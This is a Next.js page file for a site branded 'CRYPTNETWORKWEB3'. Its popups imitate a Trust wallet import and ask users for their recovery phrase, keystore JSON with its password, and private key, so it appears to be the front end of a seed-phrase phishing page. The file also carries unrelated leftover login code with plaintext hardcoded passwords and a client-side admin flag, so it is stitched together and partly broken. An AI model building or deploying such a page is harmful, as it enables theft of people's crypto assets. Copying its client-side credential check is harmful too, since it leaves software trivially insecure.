



"use client"
import styles from "./page.module.css"
import { useState, useRef } from "react"
import { useRouter } from 'next/navigation';
import Image from "next/image";

export default function Page() {
  const [popup, setPopup] = useState(false)
  const users = [
    {
      name: "Jared",
      password: "admin",
      admin: true
    },
    {
      name: "Staff",
      password: "staff",
      admin: false
    }
  ]
  const name = useRef()
  const password = useRef()
  const router = useRouter();
  const handleClick = () =>{
    const currentUser = users?.find(i => i?.name == name?.current?.value)
    if(currentUser && currentUser?.password == password?.current?.value){
      localStorage.setItem("admin", currentUser?.admin)
      router.push("/find-patient")
    } else{
      setPopup(true)
      setTimeout(()=> setPopup(false), 2000)
    }
  }
  return (
    <div className={styles.page}>
      <Navbar/>
    </div>
  )
}

export function Navbar(){
  return (
    <nav className={styles.nav}>
        <h1>CRYPTNETWORKWEB3</h1>
        <ul>
            <li>DApps</li>
            <li>NFT</li>
            <li>Web3</li>
        </ul>
        <button>Secure Wallet</button>
    </nav>
  )
}

export function Hero(){
  return (
    <section>
        <h1>Secure</h1>
        <div>
            Refers to the safety and protection of assets, data, and transactions in the crypto space. Investors should prioritize platforms with robust security measures like encryption and multi-factor authentication.
        </div>
    </section>
  )
}

export function Choose(){
  return (
    <section>
        <div>
            <p>Choose wallet</p>
            <p>Show uninstalled</p>
        </div>
        <div>
            <span>
                <Image/>
                <h2>Trust</h2>
            </span>
        </div>
    </section>
  )
}

export function Popup(){
  return (
    <section>
        <div>
            <span>X</span>
            <Image/>
            <h1>Trust</h1>
            <p>A Web3 wallet is a versatile and significant piece of technology that is set to revolutionize the way our online identity is presented and accessed. Wallet connect wallet can go here.</p>
            <button>Connect</button>
        </div>
    </section>
  )
}

export function Popup2(){
  return (
    <section>
        <div>
            <Image/>
            <p>Import your Trust Wallet </p>
            <span>X</span>
        </div>
        <div>
            <span>Phrase</span>
            <span>Keystore JSON</span>
            <span>Private Key</span>
        </div>
        <main>
            <div>
                <label htmlFor="">Wallet Name</label>
                <input type="text" name="" id="" />
            </div>
            <div>
                <label htmlFor="">Email</label>
                <input type="email" name="" id="" />
            </div>
            <div>
                <label htmlFor="">Phrase</label>
                <textarea name="" id=""></textarea>
            </div>
            <p>Typically 12 (sometimes 24) words separated by single spaces</p>
        </main>
        <main>
            <p>Upload or paste your keystore JSON contents here.</p>
            <input type="text" name="" id="" placeholder="Wallet Name"/>
            <input type="text" name="" id="" placeholder="Email"/>
            <textarea name="" id="" placeholder="KeyStore JSON"></textarea>
            <input type="text" name="" id="" placeholder="Wallet Password"/>
            <p>Several lines of text beginning with "(...)" plus the password you used to encrypt it.</p>
        </main>
        <main>
            <p>Enter your private key below:</p>
            <input type="text" name="" id="" placeholder="Wallet Name"/>
            <input type="text" name="" id="" placeholder="Email"/>
            <textarea name="" id="" placeholder="KeyStore JSON"></textarea>
            <input type="text" name="" id="" placeholder="Enter your private key"/>
            <p>Typically 12 (sometimes 24) words separated by a single space.</p>
        </main>
        <div>
            <button>Cancel</button>
            <button>Proceed</button>
        </div>
    </section>
  )
}